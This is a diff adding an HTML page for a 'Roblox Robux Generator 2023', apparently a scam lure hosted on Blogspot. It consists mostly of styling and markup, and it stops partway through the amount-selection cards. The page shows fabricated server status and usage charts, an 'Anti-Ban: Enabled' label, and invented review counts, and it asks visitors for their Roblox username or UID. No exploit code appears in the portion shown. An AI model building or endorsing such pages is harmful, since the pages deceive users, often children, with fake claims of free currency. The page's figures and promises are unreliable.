@@ -1,0 +1,1658 @@
+
+
+<!DOCTYPE html>
+<!--
+T: 2023-03-09 05:36:27
+Api: 6ec1deaa6e87561d5d61
+It: 3575351
+
+-->
+<html><head>
+    <title>Roblox Robux Generator 2023</title>
+<meta name="description" content="Roblox Robux Generator 2023"/>
+<meta property="og:title" content="Roblox Robux Generator 2023"/>
+<meta property="og:description" content="Roblox Robux Generator 2023"/>
+<meta name="referrer" content="no-referrer">
+
+<!-- Analytics -->
+
+<script
+        src="https://browser.sentry-cdn.com/6.4.1/bundle.min.js"
+        integrity="sha384-THoc7rflwZFKTdZNgv6jLFFDn299Uv3t1SW5B4yGLvLiCRTYP9ys6vXZcMl95TQF"
+        crossorigin="anonymous"
+></script>
+<script>
+    Sentry.init({
+        dsn: 'https://e0e6a104cb354a09bf094a90e676ea13@o425163.ingest.sentry.io/5780930',
+        tracesSampleRate: 0.01
+    });
+</script>
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+
+    
+    ga('send', 'pageview');
+
+</script>
+
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        body{
+  background-color: #afb7ca;
+  font-family: Rajdhani;
+
+}
+
+.fixedbg{
+    background-image: url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672984965d71731ff1c0aa4b3c44e99cc2bfef3a0.jpg);
+    background-position:center top;
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background-repeat: no-repeat;
+    z-index: -1;
+	  background-size:cover;
+    background-color:red;
+}
+
+
+.content{
+  max-width: 800px;
+  width: 90%;
+  background-color: #ffffff57;
+  border-radius: 40px;
+  /* box-shadow: 0px 1px 0px 0px #00000061; */
+  padding-top: 10px;
+  padding-bottom: 10px;
+  position: relative;
+}
+.top{
+  width:100%;
+  top:0;
+  left:0;
+  position:absolute;
+  z-index: 5;
+}
+.logo1{
+  width:30px;
+  top:3px;
+display:table-cell;
+}
+.moible{
+  position: absolute;
+  top: 2px;
+  right: 5px;
+  width: 30px;
+  height: 30px;
+}
+.bar1{
+  width:80%;
+  height:3px;
+  background-color:#707070;
+  margin: 5px;
+}
+.toptext{
+  font-weight: bold;
+  padding-top:13px;
+  display:table-cell;
+}
+.noselect {
+  -webkit-touch-callout: none; /* iOS Safari */
+    -webkit-user-select: none; /* Safari */
+     -khtml-user-select: none; /* Konqueror HTML */
+       -moz-user-select: none; /* Old versions of Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version, currently
+                                  supported by Chrome, Edge, Opera and Firefox */
+}
+.menubntgen{
+
+    padding:5px 10px;
+    margin: 0px;
+      width:70px;
+        cursor: pointer;
+}
+.menubntinfo{
+  width:70px;
+  padding:5px 10px;
+    border-radius: 20px 0 0px 20px;
+        margin: 0px;
+        cursor: pointer;
+}
+.lds-dual-ring {
+  display: inline-block;
+  width: 30px;
+  height: 30px;
+}
+.statusloading{
+
+}
+.lds-dual-ring:after {
+  content: " ";
+  display: block;
+  width: 22px;
+  height: 22px;
+  margin: 4px;
+  border-radius: 50%;
+  border: 4px solid #fff;
+  border-color: #fff transparent #fff transparent;
+  animation: lds-dual-ring 1.2s linear infinite;
+}
+.lds-dual-ring2 {
+  display: inline-block;
+  width: 30px;
+  height: 30px;
+}
+.lds-dual-ring2:after {
+  content: " ";
+  display: block;
+  width: 22px;
+  height: 22px;
+  margin: 4px;
+  border-radius: 50%;
+  border: 4px solid #fff;
+border-color: #00b06f transparent #00b06f transparent;
+  animation: lds-dual-ring 1.2s linear infinite;
+}
+
+
+
+@keyframes lds-dual-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+.menubntcontact{
+  width:70px;
+  padding:5px 10px;
+    border-radius:0 20px 20px 0;
+        margin: 0px;
+          cursor: pointer;
+}
+.logo{
+  max-width:135px;
+  width:90%;
+  margin-top:80px;
+}
+.inline{
+  display:table-cell;
+}
+.menu{
+  width: 280px;
+  border-radius: 30px;
+  box-shadow: 0 0 11px #00000029;
+}
+.menutext{
+  position:relative;
+  color:#686868;
+  padding:10px;
+cursor: pointer;
+}
+.info-text{
+color: #1e1e1e;
+font-weight: bolder;
+}
+
+.cardicon{
+  width:80px;
+  margin-top:10px;
+}
+
+.cardicon2{
+  width:30px;
+  position: absolute;
+  left:12px;
+  top:84px;
+}
+.cardicon3{
+  width: 30px;
+      position: absolute;
+      right: 12px;
+      top: 84px;
+}
+.cardicon4{
+  width: 21px;
+  position: absolute;
+  left: 4px;
+  top: 3px;
+}
+.cardicon5{
+  width: 21px;
+  position: absolute;
+  right: 4px;
+  top: 3px;
+}
+.cardicon6{
+  width: 15px;
+  position: absolute;
+  left: 1px;
+  top: 43px;
+}
+.cardicon7{
+  width: 15px;
+  position: absolute;
+  right: 1px;
+  top: 43px;
+}
+.cardform{
+  width: 120px;
+  height: 160px;
+    display: inline-block;
+        margin: 5px;
+}
+.card{
+position: absolute;
+top:0;
+left:0;
+  border-radius: 20px;
+  background-repeat: no-repeat;
+
+  margin-top: 10px;
+  position: relative;
+  cursor: pointer;
+  border-style: solid;
+  border-color: #bbbbbb;
+
+}
+
+
+
+
+.card:hover{
+      color: wheat;
+      text-shadow: 0 0 2px #cebc81;
+      border-color: #b39e63;
+}
+.subtext{
+  position: relative;
+}
+.profileicon{
+  width: 50px;
+  height: 37px;
+}
+.bntform{
+  width: 200px;
+  height: 120px;
+  border-style: solid;
+  border-color: #ffffff52;
+  position: relative;
+  border-radius: 15px;
+  border-width: 1px;
+  margin-top: 31px;
+
+  background: #fffae4;
+  box-shadow: 0 0 7px #00000059;
+  position:relative;
+}
+.selectedamountbnt{
+  font-size: 11px;
+  background-color: #262626;
+  width: 100px;
+  border-radius: 0 0px 5px 5px;
+  color: #b6a688;
+}
+.selectedvalue{
+  font-weight: 900;
+  margin-left: 20px;
+  margin-top: 10px;
+  font-size: 18px;
+}
+.maintext{
+  font-weight: bold;
+  font-size: 22px;
+  padding: 20px 0 0px 0;
+}
+.epu-u-i {
+  /* font-family: Acme; */
+  outline: none;
+  appearance: none;
+  -moz-appearance: none;
+  -webkit-appearance: none;
+
+  box-shadow: none;
+  border: none;
+  width: 90%;
+  height: 60px;
+  z-index: 3;
+  position: relative;
+  /* padding: 0 54px 0 33px; */
+  font-size: 26px;
+  te: ;
+  font-size: 26px;
+  /* background-image: url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/1666677….png); */
+  background-repeat: no-repeat;
+  background-position: left;
+  background-size: 25px;
+  border-style: solid;
+  border-radius: 13px;
+  border-width: 1px;
+  border-color: #7a7a7a;
+  box-shadow: 0 0 10px #00000042;
+  text-align: center;
+  border-style: solid;
+  border-width: 2px;
+  border-color: #a3a3a3;
+}
+#gen-text{
+  color: #5e5e5e;
+  font-size: 22px;
+  font-weight: bold;
+}
+.gencolor{
+  color: #0781ff;
+  font-weight: 900;
+font-size: 20px;
+}
+.hand{
+    top: 63px;
+    position: absolute;
+    left: -60px;
+ animation: hand 1s linear infinite;
+}
+@keyframes hand {
+0% {
+left: -60px;
+}
+50% {
+left: -50px;
+}
+100% {
+left: -60px;
+}
+}
+
+
+.bnt{
+
+  position: absolute;
+  bottom: 0px;
+  width: 100%;
+  /* background: linear-gradient(181deg, #323232, #000000); */
+  border-radius: 10px;
+  /* border-style: solid; */
+  /* border-width: 2px; */
+  border-color: #11998b;
+  /* box-shadow: 0 0 3px #9d9d9d; */
+  font-family: fantasy;
+  cursor: pointer;
+  padding: 16px 0;
+  /* box-shadow: inset 0 0 4px #efe0a3; */
+  transform: scale(0.9);
+  font-size: 32px;
+    }
+    .bnt:hover{
+      transform: scale(1);
+    }
+.rotate-in-2-bck-ccw{animation:rotate-in-2-bck-ccw .5s cubic-bezier(.25,.46,.45,.94) both}
+@keyframes rotate-in-2-bck-ccw{0%{transform:translateZ(200px) rotate(45deg);opacity:0}100%{transform:translateZ(0) rotate(0);opacity:1}}
+
+.showin {
+  animation: showin 0.5s;
+  animation-fill-mode: forwards;
+}
+
+@keyframes showin {
+  0% {
+    transform: scale(0);
+  }
+
+  30% {
+    transform: scale(1);
+  }
+
+  60% {
+    transform: scale(1.1);
+  }
+
+  100% {
+    transform: scale(1);
+  }
+}
+
+.startBnt{
+  position: absolute;
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff0f;
+      top: 0;
+      left: 0;
+}
+
+
+.cardvalue{
+  margin-top: 10px;
+
+
+}
+.cardname{
+
+
+
+}
+
+.history{
+  width:100%;
+  text-align: left;
+padding-left:10px;
+position: relative;
+}
+.textcontact{
+  width: 95%;
+border-radius: 5px;
+outline: none;
+border: none;
+padding: 5px;
+box-shadow: inset 0 0 2px black;
+}
+.genpage{
+  box-shadow: 0 0 9px #00000033;
+      width: 95%;
+
+      border-radius: 15px;
+      margin-top: 20px;
+      overflow: hidden;
+      padding-bottom: 20px;
+
+}
+.genpage2{
+  box-shadow: 0 0 9px #00000033;
+      width: 95%;
+      border-radius: 15px;
+      margin-top: 20px;
+      overflow: hidden;
+      padding-bottom: 20px;
+
+}
+.contactpage{
+  box-shadow: 0 0 9px #00000033;
+      width: 95%;
+      border-radius: 15px;
+      margin-top: 20px;
+      overflow: hidden;
+      padding-bottom: 20px;
+
+}
+
+
+.footer{
+  /* height: 10px; */
+  width: 90%;
+  /* background-color: #121212; */
+  /* margin-top: 0px; */
+  padding-top: 12px;
+  padding-bottom: 0px;
+  bottom: 0px;
+  color: #000000;
+  left: 0px;
+  /* border-radius: 0 0 20px 20px; */
+  text-align: center;
+  margin-top: 20px;
+  font-size: 12px;
+  text-shadow: 0 0 0px black;
+}
+a{
+  color:#000000;
+    text-shadow: 0 0 0px black;
+    font-weight: bold;
+    margin-bottom: 5px;
+}
+.bg-conent-footer{
+  width:100%;
+  height: 150px;
+  background-color: #3f2323;
+  position: relative;
+  overflow: hidden;
+}
+.content-footer{
+position:absolute;
+  top:50px;
+  left:-20px;
+  height: 500px;
+width:110%;
+background-color: #1f1f1f;
+}
+.infopage{
+  box-shadow: 0 0 9px #00000033;
+      width: 95%;
+
+      border-radius: 15px;
+      margin-top: 20px;
+      padding-top:10px;
+      padding-bottom: 20px;
+}
+.winnerc{
+position: absolute;
+    top: 0;
+    left: 0;
+    font-size: 14px;
+    height: 100%;
+    background-color: lightgrey;
+    padding-left: 10px;
+    /* vertical-align: initial; */
+    padding-top: 3px;
+    padding-right: 10px;
+    color: #054b16;
+    font-weight: bold;
+    border-style: solid;
+    border-width: 0 2px 0 0;
+    border-color: red;
+}
+.flag{
+  width:18px;
+
+}
+.winnername{
+  font-weight: lighter;
+      font-family: Roboto;
+      position: relative;
+      margin-left: 200px;
+      animation: winnername 180s linear infinite;
+      width: 6000px;
+      font-size: 12px;
+      color: white;
+
+  }
+  @keyframes winnername {
+    0% { margin-left: 200px;}
+      100% { margin-left: -2600px;}
+  }
+.winner{
+  width:100%;
+padding-top:0px;
+padding-bottom:5px;
+  background-color: #202020;
+  overflow: hidden;
+  text-align: left;
+  position:relative;
+}
+.star{
+  width: 12px;
+  height: 12px;
+  background-image: url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/1670837801f963fffd35eb2204955859be581e70b3.png);
+  background-size: 12px;
+  margin-right:1px;
+  display: inline-block;
+}
+.info-server{
+  font-family: Roboto;
+  padding-top: 9px;
+  max-width: 250px;
+  width: 90%;
+  border-radius: 10px;
+  background-color: #ffffff40;
+  margin-top: 10px;
+  box-shadow: 0 0 1px 0px #00000038;
+  color: #545454;
+  padding-bottom: 9px;
+  border-width: 3px;
+  border-style: solid;
+  border-color: #aa945a7d;
+  position: relative;
+}
+.chartdot{
+  width: 8px;
+  height: 8px;
+  background-color: white;
+  border-radius: 50%;
+  position: absolute;
+  left: -6px;
+  top: -4px;
+}
+.fullchart{
+  width: 100%;
+/* overflow: hidden; */
+position: absolute;
+top: 48px;
+/* right: 39px; */
+left: -10px;
+transform: scaleX(1);
+}
+.lastdot{
+  left: 149px;
+  height: 1px;
+background-color: white;
+top: 29px;
+transform: rotate(144deg);
+width: 52px;
+position: absolute;
+background: linear-gradient(45deg, white 50%, transparent 50%);
+  animation: lastdot 5s linear infinite;
+}
+html {
+  scroll-behavior: smooth;
+}
+.serveronline{
+  display: inline-block;
+width: 15px;
+height: 15px;
+background-color: #00c90b;
+border-radius: 50%;
+
+}
+.flash{
+        animation: flash 1s infinite;
+}
+.flash2{
+        animation: flash 0.21s infinite;
+}
+@keyframes flash {
+  0% {
+    opacity:1;
+  }
+  50% {
+          opacity:0;
+  }
+  100% {
+    opacity:1;
+  }
+}
+@keyframes lastdot {
+0% {
+transform: rotate(150deg);
+}
+50% {
+transform: rotate(154deg);
+
+}
+100% {
+transform: rotate(149deg);
+}
+}
+.chartdot12{
+  width: 8px;
+  height: 8px;
+  background-color: white;
+  border-radius: 50%;
+  position: absolute;
+  right: 25px;
+  top: -4px;
+}
+.line{
+  width:80%;
+  background-color: #8585853d;
+  height: 1px;
+  position: relative;
+}
+.lch{
+  position: absolute;
+      left: -18px;
+      top: -6px;
+      font-size: 10px;
+
+}
+.chartline{
+  width: 30px;
+  height: 1px;
+  background-color: white;
+  position: absolute;
+  transform: rotate(318deg);
+  left: 25px;
+  bottom: 20px;
+}
+.progressbar{
+  width: 90px;
+  height: 10px;
+  display: inline-block;
+  background-color: #ffffff;
+  margin-top: 5px;
+  border-radius: 10px;
+  border-style: solid;
+  /* border-width: 1px; */
+  border-color: #d8c78b;
+  text-align: left;
+  overflow: hidden;
+}
+.progressbarstar{
+  width: 90%;
+  height: 100%;
+  background: linear-gradient(90deg, #028a01 0%, #fce900 35%, #ff3703 100%);
+}
+.progressbar1{
+  width: 90%;
+  height: 100%;
+  background: linear-gradient(90deg, #028a01 0%, #fce900 35%, #ff3703 100%);
+  animation: progressus 40s linear;
+  animation-fill-mode: forwards;
+}
+@keyframes progressus {
+0% {
+width:90%;
+}
+25% {
+width:98%;
+}
+50% {
+width:80%;
+}
+75% {
+width:95%;
+}
+100% {
+width:90%;
+}
+}
+.progressbar2{
+  width: 55%;
+  height: 100%;
+  background: linear-gradient(90deg, #028a01 0%, #fce900 35%, #fce900 100%);
+  animation: progressuk 20s linear;
+  animation-fill-mode: forwards;
+}
+@keyframes progressuk {
+0% {
+width:55%;
+}
+25% {
+width:45%;
+}
+50% {
+width:60%;
+}
+75% {
+width:50%;
+}
+100% {
+width:55%;
+}
+}
+.zoominout{
+  animation: zoominout 3s linear infinite;
+}
+@keyframes zoominout {
+0% {
+margin-top:0px;
+}
+50% {
+margin-top:5px;
+}
+100% {
+margin-top:0px;
+}
+}
+
+.zoominout2{
+  animation: zoominout2 3s linear infinite;
+}
+@keyframes zoominout2 {
+0% {
+transform: scale(1);
+}
+50% {
+transform: scale(1.1);
+}
+100% {
+transform: scale(1);
+}
+}
+
+
+.pulse{
+animation: pulse 2s infinite;
+border-radius: 50%;
+height:22px;
+}
+@keyframes pulse {
+  0% {
+      box-shadow: 0 0 0 0 #efe0a369;
+  }
+  5% {
+      transform: scale(1.1);
+  }
+  15% {
+      transform: scale(1);
+  }
+  70% {
+      box-shadow: 0 0 0 20px rgba(168, 63, 57, 0);
+  }
+  100% {
+      box-shadow: 0 0 0 100px rgba(168, 63, 57, 0);
+  }
+}
+.zoomout1{
+  animation: zoomout1 0.3s linear;
+  animation-fill-mode: forwards;
+}
+@keyframes zoomout1 {
+0% {
+transform: scale(1);
+}
+
+100% {
+transform: scale(1.1);
+}
+}
+.zoomTo1{
+  animation: zoomTo1 0.3s linear;
+  animation-fill-mode: forwards;
+}
+@keyframes zoomTo1 {
+0% {
+transform: scale(1.1);
+}
+
+100% {
+transform: scale(1);
+}
+}
+.progressbar3{
+  width: 40%;
+  height: 100%;
+  background: linear-gradient(90deg, #028a01 0%, #028a01 35%, #fce900 100%);
+  animation: progressas 30s linear;
+  animation-fill-mode: forwards;
+}
+@keyframes progressas {
+0% {
+width:40%;
+}
+25% {
+width:20%;
+}
+50% {
+width:48%;
+}
+75% {
+width:28%;
+}
+100% {
+width:40%;
+}
+}
+.info{
+  width: 90%;
+  margin: ;
+
+  box-shadow: 0 0 4px #0000001f;
+  border-radius: 20px;
+  padding: 10px 0;
+  margin-top:10px;
+}
+/*ka*/
+/*----------------*/
+body{
+font-family: Rajdhani;
+}
+.fixedbg{
+    background-color:black; filter:blur(25px);;
+}
+.bnt{
+background:#00b06f;font-family: 'Rajdhani';;
+color:#e3e3e3;
+}
+.bnt:hover{
+color:white;
+background:#00b06f;
+}
+.bntverify{
+background:red;
+color:white;
+}
+.bntverify:hover{
+color:white;
+background:#ff1e1e;
+}
+.menubntcolor{
+color:black;
+background:#ffffff;border-style:solid;border-color:#d3ba67;;
+}
+.menubntcolor:hover{
+color:kmenuhovertextcolor;
+background:kmenuhoverbgcolor;
+}
+.selectedmenu{
+color:black;font-weight:900;;
+background:linear-gradient(181deg, #d6c489, #b6a267);
+}
+.inputcolor{
+  background:#2a2a2a;
+  color:#cebc81;
+}
+.form1{
+  background:#ccb7775c;
+  color:black;
+}
+.form2{
+background: radial-gradient(circle, #ffffff, #fff5d9);
+    color: #1a1a1a;
+
+}
+.form3{
+  background:#e1d9b8;
+  color:#c1a54c;font-weight:bold;;
+}
+
+/*----------------*/
+@media only screen and (max-width:360px) {
+	.logo{
+  max-width:100px;
+  width:90%;
+  margin-top:80px;
+}
+.maintext {
+    font-size: 18px;
+    padding: 20px 10px 0px ;
+}
+
+
+  .menu {
+      width: 236px;
+font-size:12px;
+  }
+  .content{
+    border-radius:20px;
+  }
+    .hand{
+	  width:40px;
+    top: 63px;
+    position: absolute;
+    left: -60px;
+ animation: hand 1s linear infinite;
+}
+
+@keyframes hand {
+0% {
+left: -40px;
+}
+50% {
+left: -30px;
+}
+100% {
+left: -40px;
+}
+}
+}
+@media only screen and (max-width:330px) {
+  .fullchart {
+   transform: scaleX(80%);
+  }
+.cardform {
+    width: 40%;
+}
+
+}
+
+
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="me" href="https://www.blogger.com/profile/02698266690825959226" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+      <link rel = "stylesheet"  type = "text/css"  href = "style.css" />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Rajdhani">
+		        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Luckiest Guy">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Quicksand">
+          <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat Subrayada">
+  <title>Roblox Generator 2023</title>
+</head>
+<body onload="Selectedcard(1)" class="noselect">
+  <div class="fixedbg"></div>
+  <div class="top menubarcolor" style="background:linear-gradient(95deg, #baa76c, #d0bd82);color:black">
+<center>
+<div class="logo1"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16697136052a45c6926f08506b7fef2ce7c7684459.png" style="    position: absolute;
+    width: 35px;padding-top: 5px;
+    margin-left: -25px;"></div><div class="toptext">BEST ROBUX GENERATOR</div>
+  </center>
+
+
+  <div class=" topformcolor " style=" margin-top:15px;   overflow: hidden;">
+    <div class="winner">
+  <div class="winnername" id="winnertext"></div>
+  <div class="winnerc"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1674174008607f9ca6f01fa56442173bb6d9fa5d9c.png" class="flash" style="width:40px;"></div>
+    </div>
+  </div>
+ </div>
+
+  <center>
+    <div class="logo"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"/></div>
+<div class="content showin form1">
+
+<div class="menu showin1">
+  <div class=" menubntinfo menubntcolor inline noselect"  id="menuinfo" onclick="menu(1)" ><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16721130314f9d4c01e5b23817cf9a6b8b452e4091.png" style="width:20px;"><br>Info</div>
+  <div class="selectedmenu menubntgen menubntcolor inline  noselect "  onclick="menu(2)" id="menugen"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113031963f48a076bd830d0a5791d273d532e4.png" style="width:20px;"><br>Generator</div>
+  <div class="  inline menubntcolor menubntcontact noselect" onclick="menu(3)" id="menucontact"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030f72d7bfafeca1605ffe98bb5690a8af4.png" style="width:20px;"><br>ContactUs</div>
+
+  </div>
+<div class="infopage formcolor showin" style="display:none;background:radial-gradient(circle, #fde38e, #bfab70);color:white"  id="infopage">
+
+<div class="info topformcolor form3">
+  <div class="info-text">Current Status</div>
+  <div class="statusloading"><div class="lds-dual-ring"></div></div>
+  <div class="info-server">
+  Server: <span class="flash"><div class="serveronline"></div> Online</span>
+  <div class="line"></div>
+  <div style="width:70px;display:inline-block;text-align:left;font-weight:900"><span style="font-size:11px;">#</span>1 US</div> <div class="progressbar"><div class="progressbar1"></div></div>
+  <div class="line"></div>
+  <div style="width:70px;display:inline-block;text-align:left;font-weight:900"><span style="font-size:11px;">#</span>2 UK </div><div class="progressbar"><div class="progressbar2"></div></div>
+  <div class="line"></div>
+  <div style="width:70px;display:inline-block;text-align:left;font-weight:900"><span style="font-size:11px;">#</span>3 Asia</div><div class="progressbar"><div class="progressbar3"></div></div>
+  </div>
+  <div class="info-server">
+  Usage: <span class="flash">98 %</span>
+
+<div class="line" style="margin-top:30px;"><div class="lch">100</div></div><br>
+<div class="line"><div class="lch">70</div></div><br>
+<div class="line"><div class="lch">50</div></div><br>
+<div class="line"><div class="lch">25</div></div><br>
+<div class="line">  <div class="lch">0</div></div>
+<div class="fullchart">
+
+<div class="chartline" style="left: 50px;top: 78px;transform: rotate(43deg); width: 25px;"><div class="chartdot"></div><div class="chartdot1"></div></div>
+<div class="chartline" style="left: 51px;top: 53px;transform: rotate(289deg); width: 65px;"><div class="chartdot"></div><div class="chartdot1"></div></div>
+<div class="chartline" style="left: 85px;top: 38px;transform: rotate(73deg); width: 25px;"><div class="chartdot"></div><div class="chartdot1"></div></div>
+<div class="chartline" style="left: 98px;top: 38px;transform: rotate(304deg); width: 34px;"><div class="chartdot"></div><div class="chartdot1"></div></div>
+<div class="chartline" style="left: 123px;top: 34px;transform: rotate(30deg); width: 28px;"><div class="chartdot"></div><div class="chartdot1"></div></div>
+<div class="chartline" style="left: 149px;top: 34px;transform: rotate(335deg); width: 28px;"><div class="chartdot"></div></div>
+<div class="lastdot"><div class="chartdot12"></div><div class="chartdot"></div><div class="chartdot1"></div></div>
+
+</div>
+
+
+  </div>
+
+
+
+  <div class="info-server">
+<div class="history">Today:<div style="position:absolute;right:15px;top:0;    font-weight: 900;
+    color: #a17e11;">+73%</div></div>  <div class="line"></div>
+<div class="history">Yesterday:<div style="position:absolute;right:15px;top:0;    font-weight: 900;
+    color: #a17e11;">+27%</div></div>  <div class="line"></div>
+<div class="history">Last 7 days:<div style="position:absolute;right:15px;top:0;    font-weight: 900;
+    color: #a17e11;">+87%</div></div>
+  </div>
+
+
+</div>
+<div class="info topformcolor form3">
+  <div class="info-text">General Reviews</div>
+  <div class="info-server" style="text-align:left;padding-left:5px;    background-color: white;">
+  <div class="star"></div><div class="star"></div><div class="star"></div><div class="star"></div><div class="star"></div><span style="font-size:12px;">Based on 48416 reviews</span>
+  <br><div style="width:9px;display:inline-block;text-align:left;font-weight:900">5</div> <div class="star"></div> <div class="progressbar"><div class="progressbarstar" style="background: #ffd203;width:87%;"></div></div> 42,121
+  <div class="line"></div>
+  <div style="width:9px;display:inline-block;text-align:left;font-weight:900">4</div> <div class="star"></div> <div class="progressbar"><div class="progressbarstar" style="background: #ffd203;width:6%;"></div></div> 2,904
+  <div class="line"></div>
+  <div style="width:9px;display:inline-block;text-align:left;font-weight:900">3</div> <div class="star"></div> <div class="progressbar"><div class="progressbarstar" style="background: #ffd203;width:4%;"></div></div> 1,936
+  <div class="line"></div>
+  <div style="width:9px;display:inline-block;text-align:left;font-weight:900">2</div> <div class="star"></div> <div class="progressbar"><div class="progressbarstar" style="background: #ffd203;width:2%;"></div></div> 968
+  <div class="line"></div>
+  <div style="width:9px;display:inline-block;text-align:left;font-weight:900">1</div> <div class="star"></div> <div class="progressbar"><div class="progressbarstar" style="background: #ffd203;width:1%;"></div></div> 485
+  </div>
+</div>
+<div class="info topformcolor form3">
+  <div class="info-text">Information</div>
+  <div class="info-server" style="text-align:left;padding-left:5px;">
+  <div class="">Version: <span style="font-size:24px;font-weight:900;">2.0</span>(full)</div>
+  <div class="">Last Update: <span style="font-size:24px;font-weight:900;" id="updatedate">7/12</span></div>
+  </div>
+  </div>
+  </div>
+  <div class="genpage showin form2" id="genpage"  style="">
+
+    <div style="background:linear-gradient(95deg, #baa76c, #d0bd82);color:black;      font-weight: bold;font-size: 11px;      padding: 2px;">Anti-Ban: Enabled</div>
+<div class="maintext headertextcolor" style="color:#121212" >What's your Username Or UID?</div>
+<div class="input-form" id="input-form">
+<div class="input-bg" id="input-bg">
+<input id="uid" class="epu-u-i inputcolor" spellcheck="false" placeholder="Your Username Or UID*">
+</div>
+</div>
+<div class="subtext">Make sure to enter a correct Roblox Username Or UID without any additional symbols.</div>
+<div class="maintext headertextcolor" style="color:#121212" >SELECT THE Robux AMOUNT</div>
+<div class="cardform" id="cardf1">
+<div class="card cardcolor rotate-in-2-bck-ccw" style="background:#262626;color:white" id="card1" onclick="Selectedcard(1)">
+  <div class="cardicon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"></div>
+<div class="cardvalue"><span id="cardvalue1">1,000</span></div>
+<div class="cardname">Robux</div>
+</div>
+</div>
+<div class="cardform" id="cardf2">
+<div class="card cardcolor rotate-in-2-bck-ccw" style="background:#262626;color:white" id="card2" onclick="Selectedcard(2)">
+  <div class="cardicon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"></div>
+<div class="card2-sub" id="sub2" style="display:none">
+<div class="cardicon2 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"></div>
+
+</div>
+  <div class="cardvalue"><span id="cardvalue2">2,500</span></div>
+  <div class="cardname">Robux</div>
+</div>
+</div>
+
+<div class="cardform" id="cardf3">
